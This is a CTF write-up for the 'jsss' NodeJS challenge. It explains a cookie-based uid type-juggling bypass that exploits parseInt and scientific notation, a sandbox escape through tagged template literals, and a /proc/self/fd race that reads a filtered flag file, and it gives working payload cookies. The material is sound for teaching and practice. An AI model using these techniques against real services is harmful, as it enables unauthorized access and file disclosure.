# jsss

#### Score: 953

> Disclamer: Unfortunetly I was only able to solve this challange 1 hour after
> the CTF was already over, So I didn't get any points for completing it.

> If you have any questions, I'll be glad to answer them. You can do so by
> opening an issue.

## Description  
huh, yet another [NodeJS](http://65.21.255.24:5002/) challenge...  
Download source code from
[here](https://github.com/omerAF/CTFs/raw/master/asiactf_finals_2021/jsss/jsss_79f57b25836a36ef09084064b72bb1607f3029d1.txz)

## Write UP

In this challange, the goal was to find a vulnerability in the API of an
unnamed shop, and to read the flag located in `/flag.txt`.  
The API supports loging in, registering, adding an order to your cart and
checking that order out.  

To keep track of the Identity of the user, the API uses the following cookies:  
- uid - The uid recieved on registration.  
- passwd - A hash of the password you registered with.  
- order - The current state of your order.

### What's an order?

The term "order" doesn't really makes sense in the context of this challenge.
The only thing that matters is that we have full control over the order, as
it's being sent by us as a cookie.

```javascript  
let order = req.cookies.order  
...  
req.userOrder = order  
```

### What happens when we are checking out?

You might have noticed the following line, at the end of the checkout
function:  
```javascript  
result = new String(vm.run(`sum([${req.userOrder}])`))  
````

It seems our order is being evaluated inside a sandbox. We might be able to
escape that sandbox, once we understand how to run in it.

### Reaching the sandbox  
To reach it we need to pass some `if` clauses.

First, we need to be logged in, and have an existing order as a cookie:  
```javascript  
if(req.userUid == -1 || !req.userOrder)  
	return res.json({ error: true, msg: "Login first" })  
```

Second, we need to be authenticatied as the user with `uid` 0, and our order
should not contain the char `(`:  
```javascript  
if(parseInt(req.userUid) != 0 || req.userOrder.includes("("))  
	return res.json({ error: true, msg: "You can't do this sorry" })  
```

In addition, there is also a rate limit:  
```javascript  
if(checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip)+1 > now()){  
	return res.json({ error: true, msg: 'too fast'})  
```

Everything here seems reasonable, except for being logged in as the user with
`uid` 0.  
This account is the first one created, which happens to be the account of the
admin:  
```javascript  
users.add({ username: "admin", password: hashPasswd(rand()), uid: lastUid++ })  
```

### Bypass the admin validation

But don't fear! There is a way bypass the admin validation.  
Look at the authentication logic:  
```javascript  
req.userUid = -1  
req.userOrder = ""

let order = req.cookies.order  
let uid = req.cookies.uid  
let passwd = req.cookies.passwd

if(uid == undefined || passwd == undefined)  
	return next()

let found = false  
for(let e of users.entries())  
	if(e[0].uid == uid && e[0].password == passwd) // Our uid is being checked here  
		found = true

if(found){  
	req.userUid = uid  
	req.userOrder = order  
}

next()  
```

Compared to the validation inside `checkout`:  
```javascript  
if(parseInt(req.userUid) != 0 || req.userOrder.includes("("))  
	return res.json({ error: true, msg: "You can't do this sorry" })  
```

Noticed something interesting?

In the validation inside `checkout` there is an extra call to `parseInt`.  
The `uid` cookie is passed as a string to the backend. When comparing it
against a number, it's being juggled (=evaluated) as a `float`, but when
calling to `parseInt` the server is parsing it as an `int`

> So if we can find a valid float `uid` which evaluate as `0` when we call to
> `parseInt`, we can login using the password for our account, **AND** pass
> the validation in `checkout`!!!

To do so, we can use a **scientific notation**, or **e-notation**

### What's a scientific notation?

[Scientific notation](https://en.wikipedia.org/wiki/Scientific_notation) is a
way of expressing extremly large and small numbers.  
Using it, it's possible to express numbers like 5000000 as 5 * 10⁶, or as
`5e6`. Both expressions evaluate to the same number.

Let's say the `uid` we registered with is `9`. We can represent it as 0.9 *
10¹, or `0.9e1`.  
When our `uid` cookie is being checked in the authentication phase, it's being
evaluated as `9`, since `"0.9e1" == 0.9e1 == 9`  
```javascript  
if(e[0].uid == "0.9e1" && e[0].password == passwd) // "0.9e1" == 0.9e1 == 9  
```

But we also pass the validation in `checkout`, because `parseInt("0.9e1") ==
0`:  
```javascript  
if(parseInt(req.userUid) != 0 || req.userOrder.includes("(")) // We pass this
validation since parseInt("0.9e1") == 0  
```

So to bypass the admin validation, we need to send the following cookie
instead of the legitimate one: `uid=0.9e1`.  
Notice the malicious `uid` should change according to the legitimate `uid` of
the user you own.  
For example, if the `uid` was `12`, you should set the malicious cookie to
`uid=0.12e2`.  

### The sandbox

We are now able to execute code inside the sandbox! in case you already
forgot, it looks like this:  
```javascript  
result = new String(vm.run(`sum([${req.userOrder}])`))  
````  
And we have control over the `req.userOrder` variable.  
But we face a few limitations:  

1. The `req.userOrder` variable cannot contain the char `(`.  
2. There is a timeout of 20 milliseconds for the sandbox.  
3. The only non-default functions available to us are those:  
```javascript  
readFile: (path)=>{  
	path = new String(path).toString()  
	if(fs.statSync(path).size == 0)  
		return null  
	let r = fs.readFileSync(path)  
	if(!path.includes('flag'))  
		return r  
	return null  
},  
sum: (args)=>args.reduce((a,b)=>a+b),  
getFlag: _=>{  
	// return flag  
	return secretMessage  
}  
```

It would be perfect if we were able to call to `readFile` and get the flag,
but there is a check that doesn't allow us to get the content of any file
containing `flag` in its path.

### Calling a function

Because we can't use an opening parentheses `(`, we need to call functions by
using [tagged template literal](https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Template_literals).  
Basically, it's possible to call functions like this:

```javascript  
console.log`1`  
getFlag``  
readFile`/etc/passwd`  
```

So we can set our `order` cookie to ``` order=getFlag`` ```:

```javascript  
// cookie: order=getFlag``  
result = new String(vm.run(`sum([${req.userOrder}])`))  
result = new String(vm.run(`sum([getFlag``])`))  
```

And it prints out the `secretMessage`, which is [`padoru
padoru`](https://www.youtube.com/watch?v=fvO2NFDIEgk).  
But we aren't interested in Anime, so we need to find a way to get the flag.  

### Getting the flag from the sandbox

Notice we can read every file the `app` user has permissions to read, as long
as it doesn't contain `flag` in its path.  
For example, we can read `/etc/passwd`

```javascript  
// cookie: order=readFile`/etc/passwd`  
result = new String(vm.run(`sum([${req.userOrder}])`))  
result = new String(vm.run('sum([readFile`/etc/passwd`])'))  
```

Is there a way to reference the `/flag.txt` file without explicitly using its
name?

Yes there is! To understand how, you first need to be familiar with these two
concepts: [The /proc
Filesystem](https://www.kernel.org/doc/html/latest/filesystems/proc.html#process-
specific-subdirectories) and [File
Descriptors](https://en.wikipedia.org/wiki/File_descriptor)

Basically, the `/proc` filesystem is a directory containing information about
running processes (and some other stuff, not relevant for now).  
File descriptors are unique integer IDs, specific for each process, each
points to a different open file in the kernel (and some other stuff, not
relevant for now).  
A file descriptor is created when a file is opened, **AND DELETED WHEN THE
FILE IS EXPLICITLY CLOSED**. This would be important later.  

Inside the `/proc` filesystem there is a folder for each PID, in which you can
find another folder named `fd`, that contains all the file descriptors that
exist at the moment for the process.

Try it for yourselves, open a linux machine and execute:  
```bash  
ls -al /proc/1/fd  
```  
You can now see all the file descriptors that exist for the process with the
PID 1.  
Notice that in the `/proc` filesystem the file descriptors are represented as
links to the original files.  
So reading `/proc/1/fd/3` will actually read the file that the file descriptor
3 in the process with the PID 1 is associated with.  

> That means, that if a process on the machine is accessing `/flag.txt` at the
> moment, it has a file descriptor pointing to it. We can then read the flag
> from the path: `/proc/{PID}/fd/{FD}`

### What process is reading `/flag.txt`?

Notice in `readFile`:  
```javascript  
readFile: (path)=>{  
	path = new String(path).toString()  
	if(fs.statSync(path).size == 0)  
		return null  
	let r = fs.readFileSync(path)  
	if(!path.includes('flag'))  
		return r  
	return null  
}  
```

The path we give to the `readFile` function is read from anyway, **even if the
path contains `flag`**. That means, that even if we can't read the contents of
`/flag.txt` directly, we can still invoke the creation of a file descriptor by
running `readFile('/flag.txt')`.  
We won't be able to get the output, but it would create a file descriptor
pointing to `/flag.txt`, in the `nodejs` process.  

### The final solution ;)  
So the plan is:  
1. Start a thread that constently tries to read the flag. It won't succeed, but it will be creating those precious file descriptors in `/proc/self/fd`.  
2. Imediatly start another thread, that tries to read all the files in `/proc/self/fd`.  
3. Continue doing step 1 and 2 until it works.

The `order` cookie in the file descriptor creation thread:  
```javascript  
a = _=> { return readFile`/flag.txt` + readFile`/flag.txt` +
readFile`/flag.txt` + readFile`/flag.txt` + readFile`/flag.txt` +
readFile`/flag.txt` + a`` }, a``  
````  
It creates a function named `a`, which uses recursion to keep trying to read
`/flag.txt`

The `order` cookie in the file descriptor reader thread:  
```javascript  
readFile`/proc/self/fd/0`, readFile`/proc/self/fd/1`,
readFile`/proc/self/fd/2`, readFile`/proc/self/fd/3`,
readFile`/proc/self/fd/4`, readFile`/proc/self/fd/5`,
readFile`/proc/self/fd/6`, readFile`/proc/self/fd/7`,
readFile`/proc/self/fd/8`, readFile`/proc/self/fd/9`,
readFile`/proc/self/fd/10`, readFile`/proc/self/fd/11`,
readFile`/proc/self/fd/12`, readFile`/proc/self/fd/13`,
readFile`/proc/self/fd/14`, readFile`/proc/self/fd/15`,
readFile`/proc/self/fd/16`, readFile`/proc/self/fd/17`,
readFile`/proc/self/fd/18`, readFile`/proc/self/fd/19`,
readFile`/proc/self/fd/20`, readFile`/proc/self/fd/21`,
readFile`/proc/self/fd/22`, readFile`/proc/self/fd/23`,
readFile`/proc/self/fd/24`, readFile`/proc/self/fd/25`,
readFile`/proc/self/fd/26`, readFile`/proc/self/fd/27`,
readFile`/proc/self/fd/28`  
```  
And yes, there is probably a better way to implement the file descriptor
reader using loops, but it works.

Because the threads start immediatly, there's sometimes a race condition in
the rate limmiter validation, that allows us to pass it and run two instances
of `checkout` at the same time.  
Either that, or something about my implementation sometimes causes the file
descriptor to never close, which works as well.  

Original writeup
(https://github.com/omerAF/CTFs/tree/master/asisctf_finals_2021/jsss).